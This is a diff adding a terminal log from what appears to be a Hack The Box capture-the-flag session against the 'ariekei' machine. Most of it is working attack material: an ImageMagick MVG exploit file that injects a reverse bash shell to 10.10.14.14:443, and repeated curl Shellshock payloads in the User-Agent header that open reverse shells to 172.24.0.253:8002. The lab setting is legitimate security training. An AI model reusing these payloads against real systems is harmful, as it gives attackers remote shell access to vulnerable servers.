@@ -1,0 +1,25 @@
+root@parrot:~/hackthebox/ariekei# ssh --help                                    
+unknown option -- -                     
+usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]                       
+           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]          
+           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]           
+           [-i identity_file] [-J [user@]host[:port]] [-L address]              
+           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]     
+           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]          
+           [-w local_tun[:remote_tun]] destination [command]                    
+root@parrot:~/hackthebox/ariekei# cat exploit.mvg                               
+push graphic-context                    
+viewbox 0 0 640 480                     
+fill 'url(https://"|setsid /bin/bash -i >& /dev/tcp/10.10.14.14/443 0<&1 2>&1")'                                                                                 
+pop graphic-context                     
+root@parrot:~/hackthebox/ariekei# curl -A '() { :; }; echo; echo; /bin/bash -i >& /dev/tcp/172.24.0.253/8002 0<&1 2>&1' http://localhost:8001/cgi-bin/stats      
+
+curl: (18) transfer closed with outstanding read data remaining                 
+root@parrot:~/hackthebox/ariekei# curl -A '() { :; }; echo; echo; /bin/bash -i >& /dev/tcp/172.24.0.253/8002 0<&1 2>&1' http://localhost:8001/cgi-bin/stats      
+^C                                      
+root@parrot:~/hackthebox/ariekei# ^C    
+root@parrot:~/hackthebox/ariekei# ^C    
+root@parrot:~/hackthebox/ariekei# ^C    
+root@parrot:~/hackthebox/ariekei# curl -A '() { :; }; echo; echo; /bin/bash -i >& /dev/tcp/172.24.0.253/8002 0<&1 2>&1' http://localhost:8001/cgi-bin/stats      
+^C                                      
+root@parrot:~/hackthebox/ariekei#       
